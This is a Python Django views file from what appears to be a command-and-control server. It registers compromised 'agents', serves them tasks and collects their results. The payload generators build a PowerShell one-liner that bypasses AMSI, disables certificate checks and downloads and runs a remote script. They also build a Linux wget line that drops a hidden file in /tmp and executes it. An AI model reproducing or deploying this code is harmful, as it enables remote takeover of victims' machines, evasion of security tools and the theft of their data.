import base64
from django.contrib.auth.decorators import login_required
from django.shortcuts import render 
from .forms import *
from .models import *
import netifaces
import os
import random
import string
from django.http import HttpResponse , JsonResponse
from django.views import View
from flask import Flask
from django.contrib.auth.models import User
from rest_framework.response import Response
from rest_framework.views import APIView
from .serializers import *
from datetime import datetime

current_path= os.path.dirname(os.path.abspath(__file__))
listen_path = current_path +"/data/listeners/"
app         = Flask(__name__)
port = 8000


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


#Agent Registeration by sending POST-Req with hostname & username after executing the payload on the Target
def registerAgent(request):
    if request.method=='POST':
        hostname = request.POST['hname']
        username = request.POST['username']
        remoteip = (get_client_ip(request))
        eth = request.POST['eth']
        if Agent.objects.filter(hname = hostname).filter(username=username).exists():
            data = Agent.objects.filter(hname = hostname).filter(username = username).values()[0]
            agentname = data['name']
            oldusername = data['username']
            if data['ip'] != remoteip:
                s=Agent.objects.filter(hname = hostname).get(username=username)
                s.ip = remoteip
                s.save()
        else:
            agentname     = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) #ASFASA
            s=Agent(name=agentname, ip = remoteip, hname= hostname, username= username )
            s.save() 
        
        Listener.agent(agentname,remoteip, eth)
        request.session['agentName'] = agentname
        response = HttpResponse(agentname)
        response.set_cookie('agentName' , agentname)
        return response
    else:
        return ('',204)

    
class Listener():
    class PostListener(View):
        def post(self,request):    
            eth = request.POST['listener']
            listneres = ListenerForm.objects.all()
            if not listneres:
                listnerForm = ListenerForm()
                listnerForm.interface = eth
                listnerForm.created_date= datetime.now()
                listnerForm.save()
                return JsonResponse({'data': True},status=200)
            else:
                for listener in listneres:
                    if listener.interface == eth:
                        oListener = ListenerForm.objects.get(interface = eth)
                        oListener.created_date = datetime.now()
                        oListener.save()
                        return JsonResponse({'data': True},status=200)
                    else:       
                        listnerForm = ListenerForm()
                        listnerForm.interface = eth
                        listnerForm.created_date= datetime.now()
                        listnerForm.save()
                        return JsonResponse({'data': True},status=200)

        def get(self,request):
            listeners = ListenerForm.objects.order_by("-created_date").all()
            return render(request, 'blog/listeners.html' , {"listeners" : listeners})

    class payloadGen(View):
        def post(self,request):
            eth = request.POST['listener']   
            jitter = request.POST['time']      
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            with open(os.path.dirname(os.path.abspath(__file__))+"/powershell.ps1","rt") as p:
                payload = p.read()
            payload = payload.replace('REPLACE_IP',ip)
            payload = payload.replace('REPLACE_PORT',str(port))
            payload = payload.replace('REPLACE_INTERFACE',eth)
            payload = payload.replace('REPLACE_JITTER',jitter)
            with open(listen_path+"/Win-{}".format(eth),"wt") as R:
                R.write(payload)

            listener = ListenerForm.objects.get(interface= eth)
            if listener:
                listener.ip = ip
                listener.save()
            amsi= '$apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields(\'NonPublic,Static\');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true);'
            noCheckCert= '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};'
            oneliner = "{} {} IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/sc/{}\')".format(amsi,noCheckCert,ip, str(port), eth)
            return JsonResponse({"payload" : oneliner} , status=200)

#powershell.exe -nop -w hidden -c 

        def get(self,request):
            return render(request,'blog/payload-Gen.html')



    class lin_payloadGen(View):
        def post(self,request):
            eth = request.POST['listener']
            jitter = request.POST['time']      
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            with open(os.path.dirname(os.path.abspath(__file__))+"/bash","rt") as p:
                payload = p.read()
            payload = payload.replace('REPLACE_IP',ip)
            payload = payload.replace('REPLACE_PORT',str(port))
            payload = payload.replace('REPLACE_INTERFACE',eth)
            payload = payload.replace('REPLACE_JITTER',jitter)

   
            with open(listen_path+"/Lin-{}".format(eth),"wt") as R:
                R.write(payload)
                
            listener = ListenerForm.objects.get(interface= eth)
            if listener:
                listener.ip = ip
                listener.save()    
                
            oneliner = "wget --no-check-certificate https://{}:{}/lin_download/{} -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile".format(ip, str(port), eth)
            return JsonResponse({"payload" : oneliner} , status=200)

        def get(self,request):
            return render(request,'blog/lin_payload-Gen.html')

    class agent():   
        
        def __init__(self, name, remote , eth):

            self.name      = name
            self.remote  = remote
            self.eth = eth
            self.sleept    = 3
            self.Path      = listen_path+"agents/{}/".format(self.name)
            self.tasksPath = "{}tasks".format(self.Path, self.name)
            netifaces.ifaddresses(eth)
            self.eth_ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            
            if os.path.exists(self.Path) == False:
                os.mkdir(self.Path)
                
# Create Download link to redirect to sendFile funtion
        def sendScript(request , eth=''):
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            oneliner = "IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/win_download/{}\')".format(ip,str(port),eth)
            return HttpResponse(oneliner)

# execute payload windows content to get the connection to our server
        def win_sendFile(request, eth=''):
            f    = open(listen_path+"/Win-{}".format(eth), "rt")
            data = f.read()
            f.close()
            return HttpResponse(data)
        
# execute payload linux content to get the connection to our server
        def lin_sendFile(request, eth=''):
            f    = open(listen_path+"/Lin-{}".format(eth), "rt")
            data = f.read()
            f.close()
            return HttpResponse(data)

# read tasks then remove tasks file
        def serveTasks(request,name=''):
            tasksPath = listen_path+"agents/{}/tasks".format(name)
            if os.path.exists(tasksPath):
                with open(tasksPath, "r") as f:
                    task = f.read()
                    
                os.remove(tasksPath)    
                return HttpResponse(task)
            else:
                return HttpResponse('')

        #Receive results from the Agent then put it in result file
        def receiveResults(request,name=''):
            resultspath = listen_path+"agents/{}/results".format(name)
            if os.path.exists(resultspath) == False :
                f= open(resultspath,"w+")
            if request.method == 'POST':
                result = request.POST['result']
                agent_Tasks = AgentTasks.objects.order_by("-created_date")[0]
                agent_Tasks.task_result = result
                agent_Tasks.save()
                with open(resultspath,'a') as r:
                    r.write(result) 
                    r.close()   
                return HttpResponse('')
            else:
                return HttpResponse('')

        def LinreceiveResults(request,name=''):
            resultspath = listen_path+"agents/{}/results".format(name)
            if os.path.exists(resultspath) == False :
                f= open(resultspath,"w+")
            if request.method == 'POST':
                result = request.body.decode()
                base64_bytes = result.encode('ascii')
                message_bytes = base64.b64decode(base64_bytes)
                result = message_bytes.decode('ascii')
                agent_Tasks = AgentTasks.objects.order_by("-created_date")[0]
                agent_Tasks.task_result = result
                agent_Tasks.save()
                with open(resultspath,'a') as r:
                    r.write(result) 
                    r.close()
                return HttpResponse('')
            else:
                return HttpResponse('')


#########################################################################

def LoginPage(request):
    return render(request  , 'blog/login.html' )

@login_required
def HomePage(request):
    listeners = ListenerForm.objects.all()
    agents = Agent.objects.all()
    response = render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners) , "agents" : list(agents) } )
    return response

@login_required
def AgentPage(request):
    agents = Agent.objects.all()
    return render(request  , 'blog/agents.html' , {"agents" : list(agents)} )

@login_required
def Tasks(request , name):
    oAgent = Agent.objects.get(name = name)
    return render(request  , 'blog/tasks.html' , {"agentName": name , "agentId": oAgent.pk,   "currentPath" : current_path})

@login_required
def AgentTask(request , id):
    oAgentTask = AgentTasks.objects.get(pk = id)
    return render(request  , 'blog/agentTask.html' , {"oAgentTask": oAgentTask })

class GetAgentsTasks(APIView):
    def get(self , request , name):
        queryset = AgentTasks.objects.select_related('module').select_related('agent').select_related('user').filter(agent__name = name).order_by('-created_date').all()
        serializer = AgentTaskSerializer(queryset, many=True, context={'request': request})
        return Response(serializer.data)

class GetFileResult(APIView):
    def get(self , request , name):
        f = open("{}".format(current_path+"/data/listeners/agents/"+ name + "/results"), "rt")
        strFile = ''
        for lines in f.readlines():
            strFile += lines
        task = f.read()
        f.close()   
        return HttpResponse(strFile ,  content_type="text/plain")

class TasksApi(APIView):
    def get(self , request , type):
        if type == 0:
            queryset = Modules.objects.all()   
        elif type == 1:
              queryset = Modules.objects.filter(module_type=1) 
        elif type == 2:
              queryset = Modules.objects.filter(module_type=2)
        elif type == 3:
              queryset = Modules.objects.filter(module_type=3)
        elif type == 4:
              queryset = Modules.objects.filter(module_type=4)
        else:
             queryset = Modules.objects.filter(module_type=5)
             
        serializer = ModuleSerializer(queryset, many=True, context={'request': request})
        return Response(serializer.data)


@login_required
def ListenersPage(request):
    return render(request  , 'blog/listeners.html' )



@login_required
def HackerUser(request):
    Users  = User.objects.all()
    return render(request  , 'blog/creatuser.html' , {'users' : list(Users) } )


@login_required
def Launcher(request):
    return render(request  , 'blog/launcher.html')